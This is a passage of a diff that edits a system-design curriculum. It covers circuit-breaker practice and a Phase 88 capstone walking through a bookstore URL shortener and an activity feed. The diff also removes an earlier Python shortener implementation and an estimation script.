+
+```text
+Checkout API → payments (timeout 2s, max 2 retries with jitter, idempotency key)
+            → inventory (timeout 500ms, breaker; on open: fail the order, do not guess stock)
+            → enqueue receipt email (async; Phase 84) — never block checkout on SMTP
+
+If payments breaker open:
+  return 503 with retry-after — better than 30s hangs × 200 workers
+```
+
+Golden rules: every outbound call has a timeout; retries are capped and idempotent; breakers trip on error rate/latency; degrade gracefully when you can (cached non-critical reads) and fail loudly when you cannot (money).
 
 ```python playground=cs-phase-87-circuit-breaker
 # Tiny circuit breaker: open after 3 failures; half-open after cooldown.
@@ -19032,15 +14899,18 @@ for t, ok in enumerate([False, False, False, False, True], start=1):
     print("   →", b.state)
 ```
 
-**PRACTICE UNTIL IT FEELS FAMILIAR**
+**PRACTICE:**
 
 | Difficulty | Task |
 | ---------- | ---- |
 | Easy | Define timeout, retry, circuit breaker in one line each |
 | Medium | Explain why retries without jitter worsen an outage |
-| Hard | Design breaker settings for a payments dependency (what opens, what half-open means) |
+| Medium | Contrast Phase 86 consensus vs Phase 87 breaker for “payments is sick” |
+| Hard | Design breaker + timeout + retry budget for bookstore payments (what opens, what half-open means, what the user sees) |
 
-**WHY THE NEXT TOPIC IS NEEDED - Complete System Design:** You now have scaling, cache, async, CAP, consensus, and reliability tools. Phase 88 forces you to combine them in a full walkthrough without being prompted which tool to use.
+**WHAT THIS UNLOCKS NEXT:**
+
+You now have the Story XI toolbox: process and estimates (81), bottlenecks (82), cache (83), async (84), CAP/consistency (85), consensus (86), caller survival (87). Knowing each tool is not the same as choosing among them when a prompt is underspecified. Phase 88 forces an end-to-end **learning** walkthrough that uses the levers together — not interview theater (that returns in Phase 103).
 
 ---
 
@@ -19048,494 +14918,169 @@ for t, ok in enumerate([False, False, False, False, True], start=1):
 
 ---
 
-
 # PHASE 88 - Complete System Design
 
 **Track:** System Design & Distributed Systems
 
-**WHAT YOU WILL BE ABLE TO DO:** Run a full system-design walkthrough unprompted - requirements → capacity → components → data → trade-offs → failure modes - using Phases 81-87 as a toolbox. This is the **Story XI learning capstone** (interview application of the same skill returns in Story XV / Phase 103).
+**WHAT YOU WILL BE ABLE TO DO:** Run a full system-design walkthrough unprompted — requirements → capacity → components → data → trade-offs → failure modes — using Phases 81–87 as a toolbox. This is the **Story XI learning capstone**. Interview application of the same skill under clock pressure returns in Story XV / Phase 103.
 
-**WHAT YOU SHOULD KNOW FIRST:** Phases 81-87 (foundations through reliability patterns). This phase combines them; it does not introduce a new building block.
+**WHAT YOU SHOULD KNOW FIRST:** Phases 81–87 — foundations through reliability patterns. This phase combines them; it does not introduce a new building block.
+
+**LEARNING RESOURCES:**
+
+- [Design a URL Shortener (ByteByteGo)](https://www.youtube.com/watch?v=JQDHz72OA3c) — compare after you draft your own
+- [System Design Primer — worked solutions](https://github.com/donnemartin/system-design-primer#system-design-interview-questions-with-solutions)
+- [Excalidraw](https://excalidraw.com/) — diagram the walkthrough cold
+- Re-skim your own Story XI notes for 82–87 levers before starting
 
 ## 88.1 Putting It Together - Worked System Design Walkthrough
 
-**WHY YOU ARE LEARNING THIS:** Phases 81-87 gave you a process (81), mechanisms (82-87), and a fundamental limit (85). Knowing every technique does not tell you which to reach for when a requirement arrives underspecified. That selection process is a distinct skill - what a system design interview measures and what real design meetings consist of. This section closes the gap between "I can explain sharding" and "I can decide whether this system needs sharding" by walking complete examples.
+Phases 81–87 gave you a process, mechanisms, and a fundamental limit. Knowing every technique does not tell you which to reach for when a requirement arrives underspecified. That **selection** skill is what this phase trains: a learning walkthrough you can run without a tutor pointing at the next lever.
 
-**SEE IT BEFORE YOU MEMORIZE IT**
+**PHASE 88 VS PHASE 103 (OWNERSHIP):**
 
-- Composio refresh: [System design interview walkthroughs (ByteByteGo)](https://www.youtube.com/watch?v=HHUi8F_qAXM) *(Composio YouTube)*; [system-design-primer](https://github.com/donnemartin/system-design-primer) *(Composio GitHub)*
+| | Phase 88 (here) | Phase 103 (Story XV) |
+| - | --------------- | -------------------- |
+| Goal | Internalize the toolbox by walking a design calmly | Apply the same process under interview time pressure |
+| Framing | Curriculum capstone — teach yourself the integration | Live interview application — narration graded under clock |
+| New mechanisms | None | None |
+| Avoid | Turning this page into mock-interview theater | Re-teaching CAP/Raft from scratch |
 
-- Best animated explanation: [System Design Interview: Design a URL Shortener (ByteByteGo)](https://www.youtube.com/watch?v=JQDHz72OA3c) walks precisely the exercise below, and [Design a Chat System](https://www.youtube.com/watch?v=zKPNUMkwOJE) and [Design FB News Feed System Design Interview (Hello Interview)](https://www.youtube.com/watch?v=Qj4-GruzyDU) *(Composio YouTube; replaced dead news-feed ID)* cover the other two, so you can compare your own answer against a worked one afterwards
-- Alternative: [Gaurav Sen's system design playlist](https://www.youtube.com/playlist?list=PLMCXHnjXnTnvo6alSjVkgxV-VH6EPyvoX) reasons out loud including the dead ends, which is much closer to what the interview conversation feels like than a polished walkthrough
-- Another angle: [System Design Interview Tips (Exponent)](https://www.youtube.com/watch?v=UzLMhqg3_Wc) and [How to Crack Any System Design Interview (ByteByteGo)](https://www.youtube.com/watch?v=Y-Gl4HEyeUQ) cover the process and the scoring rubric rather than any specific system, which is the part candidates most often neglect. For the senior-level version, [Jackson Gabbard's "Intro to Architecture and Systems Design Interviews"](https://www.youtube.com/watch?v=ZgdS0EUmn70) is by an ex-Facebook interviewer and explains what is actually being graded
-- Interactive simulator: [Excalidraw](https://excalidraw.com/) is what you will literally use in a remote interview, so practise in it rather than on paper. Set a 45-minute timer, pick a prompt, and produce requirements, estimates, a diagram, and a bottleneck discussion within it. Record yourself, watch it back, and note every point where you asserted something instead of computing it. Then build the design for real with Docker Compose, because a system you have actually run is a system you can describe under pressure
-- Written documentation: [System Design Primer's worked solutions](https://github.com/donnemartin/system-design-primer#system-design-interview-questions-with-solutions) give complete answers to the classic prompts, [ByteByteGo's system design newsletter archive](https://blog.bytebytego.com/) is the best free written source, and [the High Scalability archive](http://highscalability.com/) contains real architecture write-ups from the companies that built these systems
-- GitHub implementation: [system-design-primer](https://github.com/donnemartin/system-design-primer), [awesome-system-design-resources](https://github.com/ashishps1/awesome-system-design-resources) which collects the diagrams and case studies, and [awesome-scalability](https://github.com/binhnguyennus/awesome-scalability) for real post-mortems that show which stage each company was forced into
-- Practice platform: the only practice that works is doing it out loud with someone else. [Pramp](https://www.pramp.com/) and [interviewing.io](https://interviewing.io/) pair you with real people for free or cheap mock interviews, and [Exponent](https://www.tryexponent.com/) has a structured question bank. Failing that, record yourself answering a prompt on a timer and grade your own recording against the rubric below
+Do not invent portfolio work that steals later stories. The Projects.md card for this phase is a focused design exercise, not a second capstone product.
 
-**STEP-BY-STEP EXPLANATION**
+**THE WALKTHROUGH SHAPE (SAME SIX MOVES AS 81, NOW WITH DEPTH):**
 
-System design interviews are scored on process, and the process has a shape you can rehearse. What follows is that shape, with the reason each step exists.
+1. Clarify and scope — functional list, explicit non-goals, NFRs that decide architecture.
+2. Estimate — RPS, storage, working set (Phase 81 arithmetic).
+3. API + data model — endpoints and keys; access patterns surface (59–65).
+4. Simplest design — deliberately too small.
+5. Scale by named bottlenecks — pull 82–87 only when a number forces each lever; each lever names the **new problem** it introduces.
+6. Failure modes and operations — what breaks, what Phase 80 would show, what you alert on.
 
-**Step one, clarify and scope, roughly five minutes.** The prompt is deliberately vague, and the first thing being tested is whether you narrow it before designing. Establish the functional requirements as a short explicit list, then ask what is out of scope, then establish the non-functional requirements that actually determine the architecture: how many users, what read-to-write ratio, what latency target, what availability target, and what consistency requirement. Write these on the board. Candidates who skip this step design the wrong system confidently, which is worse than designing slowly.
+Narrate options you reject. Name costs. Arrive at complexity through bottlenecks — do not draw nine boxes in minute one.
 
-**Step two, estimate, roughly five minutes.** Convert the requirements into numbers using the arithmetic from Phase 81: requests per second at average and peak, storage per year, bandwidth, and the size of the working set. The point is not precision, it is that these numbers determine every subsequent decision and make them defensible. A candidate who computes 200 writes per second has established that one database suffices and has earned the right to not shard, which is a much stronger position than either sharding unnecessarily or omitting it without justification.
+**WORKED EXAMPLE — BOOKSTORE CAMPAIGN URL SHORTENER:**
 
-**Step three, define the API and data model, roughly five minutes.** Name the endpoints with their methods and shapes, drawing on Phase 59, and sketch the tables with their keys and indexes, drawing on Phase 60. This step is where hidden requirements surface, because writing down the query you need to serve reveals whether your schema can serve it. It is also where the access patterns become explicit, and access patterns are what determine the storage choice.
-
-**Step four, draw the simplest design that meets the requirements, roughly five minutes.** Start at stage one or two of the journey. Resist the urge to draw the final architecture, because arriving at complexity through identified bottlenecks is the thing being assessed, and a diagram with nine components presented up front cannot demonstrate it.
-
-**Step five, scale it by identifying bottlenecks, roughly fifteen minutes and the core of the interview.** Walk the journey map from Phase 81, but pull mechanism depth from the owning phases: what breaks first (82), whether a cache helps and how you invalidate (83), whether work leaves the request path (84), what CAP choice you are making (85), whether you need consensus for leadership (86), and which caller-side patterns keep you alive (87). Each step should name a specific number that forces it. Consistency choices from Phase 85 get made per operation rather than globally.
-
-**Step six, deep dive on whatever the interviewer probes, roughly ten minutes.** They will pick one component and push. Common targets are the unique-id generation scheme, the cache invalidation strategy, the shard key choice, and the fan-out approach for a feed. Having a concrete opinion with a stated trade-off is what is wanted, not the single correct answer, because there rarely is one.
-
-**Step seven, address operations briefly.** Mention monitoring, what you would alert on, how you would deploy this safely given Phase 77, and what the failure modes are. Most candidates omit this and it is a cheap differentiator, because it signals you have operated a system rather than only drawn one.
-
-Two habits matter more than any specific knowledge. **Narrate your reasoning**, including the options you reject and why, because the interviewer is evaluating your thinking and cannot see it otherwise. And **state trade-offs explicitly** rather than presenting choices as obvious, since every decision in this phase costs something, and naming the cost is the difference between a design and an assertion.
-
-**PICTURE IT LIKE THIS**
-
-Designing a building. A client says they want an office. An architect who immediately starts drawing has failed, because the first questions determine everything: how many people, is the ground stable, what is the budget, what does the local code permit, and will a second floor be added later. Only after those answers does anyone draw, and the first drawing is deliberately a rough massing model rather than a detailed plan, because the point is to agree on the shape before committing to the details.
-
-The load-bearing calculation is the estimation step, and it is not optional or approximate in spirit. An architect who says "this beam feels about right" is not an architect. Working out that the floor carries 300 people at 80 kilograms is what determines whether the beam is steel or timber, and it also justifies *not* over-engineering: knowing the number is what permits the cheaper beam with confidence.
-
-Then the design is stressed against failures deliberately: what happens in a fire, in an earthquake, when the lift fails, when the occupancy doubles. That is the bottleneck walk, and the answer is never a building that cannot fail, it is a building that fails safely and predictably. Finally the drawings include how the building will be maintained: where the access panels are, how the plant is reached, what gets inspected annually. That is the operations step, and its absence is what distinguishes a rendering from a buildable design.
-
-**Internal Working, the forty-five minute structure**
+Quarry Bookstore runs campaigns: print ads and emails point at short links that redirect to product pages. Same company as the catalog; different load shape (read-heavy redirects).
 
 ```text
-  0-5    CLARIFY            functional requirements, explicit scope,
-   |                        then the numbers that decide the design:
-   |                        users, read:write, latency, availability,
-   |                        consistency. WRITE THEM DOWN.
-   v
-  5-10   ESTIMATE           rps avg and peak, storage/yr, bandwidth,
-   |                        working set. These license every later
-   |                        decision, including the omissions.
-   v
- 10-15   API + DATA MODEL   endpoints (13.2), tables, keys, indexes
-   |                        (14.2, 14.4). Access patterns surface here.
-   v
- 15-20   SIMPLEST DESIGN    stage 1-2 of the journey. Deliberately
-   |                        too small. Do NOT draw the final answer.
-   v
- 20-35   SCALE IT           <-- THE CORE. For each bottleneck:
-   |                            "at N rps, X saturates"
-   |                            "so I add Y"
-   |                            "which introduces Z"
-   |                        This is Phase 81's map, walked with 82–87 depth, narrated.
-   v
- 35-45   DEEP DIVE          they pick one component and push.
-   |                        Have an opinion AND its trade-off.
-   v
-   |     OPERATIONS         monitoring, alerts, deploy strategy,
-   |                        failure modes. Cheap differentiator.
-   v
-       WRAP UP              restate the design and its top 2 risks
-
-  WHAT IS ACTUALLY BEING GRADED
-      did you scope before designing?
-      did you compute, or assert?
-      did you reach complexity through identified bottlenecks?
-      did you name the cost of each decision?
-      did you narrate, so your reasoning was visible at all?
-
-  THE TWO MOST COMMON FAILURES
-      1. drawing the final architecture in minute three
-         -> no bottleneck reasoning is possible afterwards
-      2. never doing the arithmetic
-         -> every decision is unjustified, including correct ones
-```
-
-**Internal Working, the worked example the exercise below asks for**
-
-```text
-PROMPT: "Design a URL shortener."
+PROMPT: Design the bookstore's URL shortener.
 
 1. CLARIFY
-     in scope:  create short link, redirect, custom alias, expiry,
-                click analytics (aggregate)
-     out:       user accounts, per-click detail, spam detection
-     scale:     100M new links/month, 100:1 read:write
-     latency:   redirect p99 < 100 ms  (it is in the user's path)
-     available: 99.99% for redirects, 99.9% for creation
-     consist.:  a created link MUST resolve immediately (its creator
-                will click it). Analytics may be eventually consistent.
-                ^ note these differ. That is the interesting part.
+     in scope:  create short link, redirect, optional alias/expiry,
+                aggregate click counts
+     out:       full user accounts UI, per-click forensic detail, spam ML
+     scale:     100M new links/month, ~100:1 read:write
+     latency:   redirect p99 < 100 ms (user-facing)
+     available: 99.99% redirects; 99.9% creation OK
+     consist.:  a created link MUST resolve immediately for its creator;
+                analytics may be eventually consistent
+                ^ different operations → different levers (85.2)
 
-2. ESTIMATE                                    (from Phase 81's arithmetic)
-     writes   40/s avg, ~200/s peak       -> one primary. NO sharding.
-     reads    4,000/s avg, 20,000/s peak  -> cache is MANDATORY
-     storage  ~312 GB/yr, 1.5 TB over 5   -> one machine's disk
-     hot set  ~5 GB                       -> fits in RAM easily
-     keyspace base62^7 = 3.5e12           -> ~2900 yrs of headroom
+2. ESTIMATE                                    (Phase 81)
+     writes   ~40/s avg, ~200/s peak       → one primary; NO sharding yet
+     reads    ~4k/s avg, ~20k/s peak       → cache mandatory (83)
+     storage  ~1.5 TB / 5 years            → one disk class machine
+     hot set  few GB Zipfian               → fits RAM
+     keyspace base62^7 plenty of headroom
 
-3. API + DATA MODEL
-     POST /links      {url, alias?, ttl?}  -> 201 {short_url}
-     GET  /{code}                          -> 302 Location: <long_url>
-     GET  /links/{code}/stats              -> 200 {clicks}
+3. API + DATA
+     POST /links      {url, alias?, ttl?}  → 201 {code, short_url}
+     GET  /{code}                          → 302 Location: long_url
+     GET  /links/{code}/stats              → {clicks}
 
-     links(code PK, long_url, created_at, expires_at, creator_id)
-       index on expires_at        -- for the expiry sweep
-     clicks_daily(code, day, count)  PK(code, day)
-       -- pre-aggregated. Storing one row PER CLICK would be
-          2 billion rows/month to answer one number. (14.3/14.4)
+     links(code PK, long_url, created_at, expires_at)
+     clicks_daily(code, day, count) PK(code, day)
+       — do NOT store one row per click at this volume
 
 4. SIMPLEST DESIGN
-     [client] -> [app] -> [Postgres]        done. Serves ~200 rps.
+     Client → App → Postgres
+     Serves ~200 rps writes easily. Stops here until a bottleneck appears.
 
-5. SCALE IT, one identified bottleneck at a time
-     bottleneck: 20,000 reads/s >> one Postgres
-       + Redis cache-aside on code -> long_url. Hit rate ~95% because
-         access is Zipfian. TTL = link TTL. Immutable data, so
-         invalidation is nearly free -- the easiest possible cache.
-       remaining: 1,000 rps of misses. Fine.
-     bottleneck: app CPU at 20k rps
-       + load balancer + N stateless app instances (stage 3)
-       note: no sessions here, so nothing to externalise. Say so.
-     bottleneck: single Postgres is a single point of failure
-       + one primary for writes, two replicas for the 1,000 rps of
-         misses and for failover (stage 5)
-       PROBLEM THIS INTRODUCES: replication lag vs "creator clicks
-         their own link immediately"
-       FIX: write-through the cache on creation, so the redirect is
-         served from Redis and never touches a lagging replica.
-         This is read-your-own-writes, solved for free.
-     bottleneck: redirect latency for users on another continent
-       + geo-distributed read caches / edge PoPs. Links are immutable,
-         so this is safe: the hardest part of a CDN, invalidation,
-         does not apply.
-     NOT needed, and say why: sharding (200 writes/s, 1.5 TB),
-       microservices (one team, one bounded context).
-       Naming what you are deliberately NOT doing is a strong signal.
+5. SCALE — one bottleneck at a time
 
-6. DEEP DIVE: generating codes without collisions across N servers
-     option A  random 7 chars + uniqueness check
-                 collision probability rises with fill; needs a DB
-                 round trip per creation; simple and fine at this scale
-     option B  hash(url) truncated to 7
-                 deterministic and deduplicates identical URLs, but
-                 truncation collides and custom aliases break it
-     option C  counter -> base62
-                 zero collisions, but sequential codes are ENUMERABLE
-                 (a privacy leak: anyone can walk your whole corpus)
-     option D  per-server ranges from a central allocator, or
-               Snowflake-style ids (14.6), then base62
-                 no coordination per write, no enumeration if you
-                 permute the bits. CHOSEN.
-     Stating the trade-off of each and then choosing is the answer.
-     Choosing without stating them is not.
+     Bottleneck: 20k reads/s >> one Postgres
+       Lever 83: Redis cache-aside code → long_url
+       New problem: staleness / invalidation
+       Mitigation: links are mostly immutable until expiry;
+                   TTL = link TTL; DEL on admin disable
+       Remaining miss traffic ~1k/s — fine
 
-7. OPERATIONS
-     alert on: redirect p99, cache hit rate (a drop precedes a
-       database overload), 404 rate (broken links in the wild),
-       replication lag
-     deploy: canary, because redirects are the whole product (16.3)
-     failure modes: cache down -> 20x load hits the database. This
-       is the cold-cache problem from Phase 83, so shed load and warm
-       before accepting traffic.
+     Bottleneck: app CPU at high QPS
+       Lever 82: LB + N stateless app instances
+       New problem: sticky sessions — N/A here (no server sessions). Say so.
+
+     Bottleneck: single Postgres SPOF
+       Lever 65/82: primary + replicas for misses/failover
+       New problem: replication lag vs "creator clicks immediately"
+       Fix: write-through cache on create (83) so redirect never needs
+            a lagging replica — read-your-own-writes for free on this path
+
+     Analytics path:
+       Lever 84: enqueue click events; workers upsert clicks_daily
+       New problem: at-least-once → idempotent upserts / dedupe keys
+
+     Leadership / metadata (if multi-primary fantasy appears):
+       Lever 86: only if you truly need automated leader election —
+                 at this scale a managed primary is enough; say why
+       Do not put redirects through Raft.
+
+     Caller survival:
+       Lever 87: timeouts on Redis/DB; breaker on dependency; retries
+                 only on idempotent redirect path as appropriate
+       New problem: retry storms if misconfigured
+
+     NOT needed (and say why): sharding (200 w/s), microservices split,
+       cross-region quorum on every redirect (PACELC latency bill — 85.1)
+
+6. FAILURE MODES
+     Redis down → fall through to Postgres (capacity plan for this)
+     Postgres primary down → failover; accept brief create unavailability
+     Worker lag → stats delayed, redirects unaffected (async win)
+     Partition between regions → prefer CP for link create if dual-write
+       risk; redirects from edge cache of immutable data can stay available
 ```
 
-**Practice / Mini-Project:** Design a URL shortener (a classic, tractable system design exercise) by walking the full journey map from Phase 81:
-
-1. What does a single-server version look like? (a table mapping short codes to long URLs - Phase 61)
-2. What happens when read traffic (people clicking short links) grows? (caching - Phase 83, since reads vastly outnumber writes for this system)
-3. How do you generate unique short codes across multiple servers without collisions? (this connects back to hashing, Phase 58, and to coordinating unique IDs across shards, Phase 65)
-4. What would you replicate, and what would you shard, if this needed to serve billions of URLs?
-5. Where would consistency vs. availability trade-offs (Phase 85) show up, and which would you choose?
-
-Repeat this same five-question shape for a chat application, a social media feed, and a ride-sharing dispatch system - each stresses a different part of the stage progression (feeds stress caching and fan-out; ride dispatch stresses real-time location data and geographic partitioning).
-
-**WHAT YOU GAIN, WHAT IT COSTS, AND WHERE IT CAN FAIL**
-
-
-| Prompt              | Dominant constraint                       | The decision that defines the answer                          | Trade-off you must name                                        |
-| ------------------- | ----------------------------------------- | ------------------------------------------------------------- | -------------------------------------------------------------- |
-| URL shortener       | read-heavy, 100:1                         | cache plus a code generation scheme                           | enumerable sequential codes versus a collision check per write |
-| Chat application    | write-heavy, real-time delivery           | persistent connections and a per-conversation shard key       | WebSocket state means servers are no longer stateless          |
-| Social feed         | extreme fan-out asymmetry                 | push on write versus pull on read                             | a celebrity's 50M followers make pure push impossible          |
-| Ride dispatch       | geospatial proximity queries              | geohash or quadtree partitioning                              | cell boundaries: the nearest driver may be in the next cell    |
-| Video streaming     | bandwidth, not requests                   | CDN plus adaptive bitrate, pre-transcoded                     | storage multiplies by the number of renditions                 |
-| Rate limiter        | correctness under concurrency at high rps | sliding window in a shared store versus token bucket per node | exactness costs a network round trip on every request          |
-| Notification system | third-party fan-out and failure           | queue with retries, per-channel workers                       | at-least-once delivery means duplicate notifications           |
-| Payment ledger      | correctness above all                     | linearizable writes, idempotency keys                         | throughput ceiling accepted deliberately                       |
-
-
-
-| Interview behaviour                        | Effect on the outcome                                                                         |
-| ------------------------------------------ | --------------------------------------------------------------------------------------------- |
-| Establishing scope and numbers first       | earns the right to justify every later choice, including omissions                            |
-| Drawing the final architecture immediately | removes the possibility of demonstrating bottleneck reasoning, which is the main thing graded |
-| Naming what you deliberately did not build | reads as judgment; its absence reads as not knowing                                           |
-| Presenting a choice without its cost       | reads as memorised rather than understood                                                     |
-| Narrating rejected options                 | makes the reasoning visible, which is the only thing the interviewer can actually assess      |
-| Mentioning monitoring and deployment       | cheap differentiator, since most candidates skip it                                           |
-
-
-The trade-off that governs this entire section is between breadth and depth under a fixed time budget. Forty-five minutes does not permit a complete design of anything, so the skill is deciding where to spend the depth: enough breadth to show the whole system hangs together, then one or two components explored properly. Attempting uniform depth everywhere produces a shallow answer in every area, and going deep unprompted on your favourite component leaves the system undefined. The practical resolution is to cover breadth quickly, state explicitly which parts you are simplifying, and let the interviewer direct the depth, because they will.
-
-**SMALL WORKING EXAMPLE**
-
-```python
-# ---------------------------------------------------------------
-# The URL shortener from the walkthrough, built for real. Writing
-# the thing you designed is what makes the design defensible under
-# questioning, because you have met its actual problems.
-# ---------------------------------------------------------------
-import time, threading, sqlite3, secrets
-
-ALPHABET = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
-
-def to_base62(n: int) -> str:
-    if n == 0:
-        return ALPHABET[0]
-    out = []
-    while n:
-        n, rem = divmod(n, 62)
-        out.append(ALPHABET[rem])
-    return "".join(reversed(out))
-
-class SnowflakeIds:
-    """Option D from the deep dive: unique ids with no coordination
-    per write, so N app servers never collide and never wait.
-    (This is Phase 65's id scheme, reused.)"""
-    EPOCH = 1_700_000_000_000
-
-    def __init__(self, machine_id: int):
-        assert 0 <= machine_id < 1024
-        self.machine_id = machine_id
-        self.seq = 0
-        self.last_ms = -1
-        self.lock = threading.Lock()
-
-    def next_id(self) -> int:
-        with self.lock:
-            ms = int(time.time() * 1000)
-            if ms == self.last_ms:
-                self.seq = (self.seq + 1) & 0xFFF          # 4096 per ms
-                if self.seq == 0:                          # exhausted
-                    while ms <= self.last_ms:
-                        ms = int(time.time() * 1000)
-            else:
-                self.seq = 0
-            self.last_ms = ms
-            return ((ms - self.EPOCH) << 22) | (self.machine_id << 12) | self.seq
-
-    def next_code(self) -> str:
-        # Permute the bits before encoding, or the codes are sequential
-        # and therefore enumerable -- the privacy leak that ruled out
-        # option C. XOR with a fixed secret is enough to break the
-        # visible ordering while staying reversible and collision-free.
-        raw = self.next_id()
-        return to_base62(raw ^ 0x5DEECE66D).rjust(7, "0")[-11:]
-
-class Cache:
-    """Redis stands in as a dict. Links are IMMUTABLE, which makes this
-    the easiest possible cache: no invalidation problem exists."""
-    def __init__(self):
-        self.store: dict[str, tuple[str, float]] = {}
-        self.hits = self.misses = 0
-
-    def get(self, key):
-        entry = self.store.get(key)
-        if entry and entry[1] > time.time():
-            self.hits += 1
-            return entry[0]
-        self.misses += 1
-        return None
-
-    def set(self, key, value, ttl=86_400):
-        self.store[key] = (value, time.time() + ttl)
-
-    def hit_rate(self):
-        total = self.hits + self.misses
-        return self.hits / total if total else 0.0
-
-class Shortener:
-    def __init__(self, machine_id=1):
-        self.ids = SnowflakeIds(machine_id)
-        self.cache = Cache()
-        self.db = sqlite3.connect(":memory:", check_same_thread=False)
-        self.db.executescript("""
-            CREATE TABLE links (
-                code       TEXT PRIMARY KEY,
-                long_url   TEXT NOT NULL,
-                created_at INTEGER NOT NULL,
-                expires_at INTEGER
-            );
-            CREATE INDEX idx_expires ON links(expires_at);
-            -- Pre-aggregated, NOT one row per click. One row per click
-            -- would be 2 billion rows a month to answer one integer.
-            CREATE TABLE clicks_daily (
-                code TEXT, day INTEGER, count INTEGER,
-                PRIMARY KEY (code, day)
-            );
-        """)
-        self.click_buffer: dict[tuple[str, int], int] = {}
-
-    def create(self, long_url: str, alias: str | None = None, ttl: int | None = None):
-        if not long_url.startswith(("http://", "https://")):
-            return 400, {"error": "url must be absolute http(s)"}
-        code = alias or self.ids.next_code()
-        expires = int(time.time()) + ttl if ttl else None
-        try:
-            self.db.execute(
-                "INSERT INTO links (code, long_url, created_at, expires_at) VALUES (?,?,?,?)",
-                (code, long_url, int(time.time()), expires),
-            )
-            self.db.commit()
-        except sqlite3.IntegrityError:
-            return 409, {"error": "alias already taken"}
-
-        # WRITE-THROUGH, and this is the interesting line. It means the
-        # creator's own immediate click is served from cache and never
-        # touches a lagging read replica. Read-your-own-writes, solved
-        # as a side effect rather than with leader stickiness.
-        self.cache.set(code, long_url, ttl or 86_400)
-        return 201, {"short_url": f"https://sho.rt/{code}"}
-
-    def resolve(self, code: str):
-        cached = self.cache.get(code)
-        if cached:
-            self._count_click(code)
-            return 302, {"Location": cached}
-
-        row = self.db.execute(
-            "SELECT long_url, expires_at FROM links WHERE code = ?", (code,)
-        ).fetchone()
-        if row is None:
-            # NEGATIVE CACHING: without this, a crawler hitting random
-            # codes bypasses the cache entirely and every request
-            # reaches the database. (Phase 83's penetration failure mode.)
-            self.cache.set(code, "", ttl=60)
-            return 404, {"error": "not found"}
-        long_url, expires_at = row
-        if expires_at and expires_at < time.time():
-            return 410, {"error": "expired"}
-
-        self.cache.set(code, long_url)
-        self._count_click(code)
-        return 302, {"Location": long_url}
-
-    def _count_click(self, code):
-        # Buffer in memory and flush periodically. Writing to the
-        # database on every redirect would make the read path a write
-        # path, which at 20,000 rps defeats the entire design.
-        day = int(time.time() // 86_400)
-        self.click_buffer[(code, day)] = self.click_buffer.get((code, day), 0) + 1
-
-    def flush_clicks(self):
-        for (code, day), n in self.click_buffer.items():
-            self.db.execute(
-                "INSERT INTO clicks_daily VALUES (?,?,?) "
-                "ON CONFLICT(code, day) DO UPDATE SET count = count + ?",
-                (code, day, n, n),
-            )
-        self.db.commit()
-        self.click_buffer.clear()
-
-    def stats(self, code):
-        row = self.db.execute(
-            "SELECT SUM(count) FROM clicks_daily WHERE code = ?", (code,)
-        ).fetchone()
-        return 200, {"clicks": row[0] or 0}
-
-# --- Exercise it, and verify the design claims are actually true ---
-s = Shortener(machine_id=1)
-print(s.create("https://example.com/a/very/long/path"))
-print(s.create("https://example.com/other", alias="promo"))
-print(s.create("https://example.com/dup",   alias="promo"))    # 409
-print(s.resolve("promo"))
-print(s.resolve("nope"))                                        # 404, cached
-
-# Zipfian traffic, which is what real redirect traffic looks like.
-import random
-codes = [s.create(f"https://example.com/{i}")[1]["short_url"].split("/")[-1]
-         for i in range(200)]
-for _ in range(20_000):
-    weights = [1 / (i + 1) ** 1.2 for i in range(len(codes))]
-    s.resolve(random.choices(codes, weights=weights)[0])
-s.flush_clicks()
-print(f"\ncache hit rate over 20k redirects: {s.cache.hit_rate():.1%}")
-print("the 95% figure claimed in the design:", s.cache.hit_rate() > 0.9)
-print("clicks on the hottest code:", s.stats(codes[0]))
-
-# Prove N servers never collide, which was the whole point of option D.
-gens = [SnowflakeIds(m) for m in range(1, 6)]
-codes = {g.next_code() for g in gens for _ in range(2_000)}
-print(f"\n5 servers x 2000 codes -> {len(codes)} unique (expected 10000)")
+```text
+                    ┌──────────────┐
+   create/redirect  │  LB + apps   │
+         ──────────►│  (stateless) │
+                    └──────┬───────┘
+                           │
+              ┌────────────┼────────────┐
+              v            v            v
+           Redis        Postgres     Queue
+         (cache-aside)  primary+     (clicks)
+                         replicas       │
+                                        v
+                                     workers
+                                  (idempotent)
 ```
 
-```python
-# ---------------------------------------------------------------
-# The estimation harness, so you can run step 2 for ANY prompt in
-# about thirty seconds instead of doing it wrong under pressure.
-# ---------------------------------------------------------------
-def design_sheet(name, *, dau, actions_per_user_per_day, read_write_ratio,
-                 bytes_per_write, peak_multiple=3, retention_years=5):
-    w_day = dau * actions_per_user_per_day
-    w_avg = w_day / 86_400
-    w_peak = w_avg * peak_multiple
-    r_peak = w_peak * read_write_ratio
-    store_yr = w_day * 365 * bytes_per_write
+**SECOND SKETCH (SHORTER) — SOCIAL-STYLE ACTIVITY FEED FOR “FOLLOWED AUTHORS”:**
 
-    print(f"\n{'='*58}\n{name}\n{'='*58}")
-    print(f"  writes    {w_avg:>12,.0f}/s avg   {w_peak:>12,.0f}/s peak")
-    print(f"  reads     {w_avg*read_write_ratio:>12,.0f}/s avg   {r_peak:>12,.0f}/s peak")
-    print(f"  storage   {store_yr/1e12:>12,.2f} TB/yr  {store_yr*retention_years/1e12:>8,.1f} TB total")
-    print("  forced decisions:")
-    print(f"    cache required (reads > 5k/s)?        {'YES' if r_peak > 5_000 else 'no'}")
-    print(f"    read replicas (reads > 20k/s)?        {'YES' if r_peak > 20_000 else 'no'}")
-    print(f"    shard writes  (writes > 10k/s)?       {'YES' if w_peak > 10_000 else 'no'}")
-    print(f"    shard storage (> 2 TB)?               {'YES' if store_yr*retention_years > 2e12 else 'no'}")
-    print(f"    CDN           (read-heavy + static)?  {'YES' if read_write_ratio > 50 else 'consider'}")
+Only enough to show the toolbox transfers. Clarify: fan-out on write vs fan-out on read. Estimate: write amplification if every follower gets a copy. Cache timelines (83). Async fan-out (84). Eventual consistency for “like counts” vs stronger for “purchase receipt” (85). Do not start with Kafka + seven services. Numbers first; name the first scarce resource (82).
 
-design_sheet("URL shortener",  dau=10_000_000, actions_per_user_per_day=0.33,
-             read_write_ratio=100, bytes_per_write=260)
-design_sheet("Chat (messages)", dau=50_000_000, actions_per_user_per_day=40,
-             read_write_ratio=2, bytes_per_write=300)
-design_sheet("Social feed",     dau=200_000_000, actions_per_user_per_day=2,
-             read_write_ratio=500, bytes_per_write=400)
-design_sheet("Ride dispatch",   dau=5_000_000, actions_per_user_per_day=600,
-             read_write_ratio=1, bytes_per_write=100)
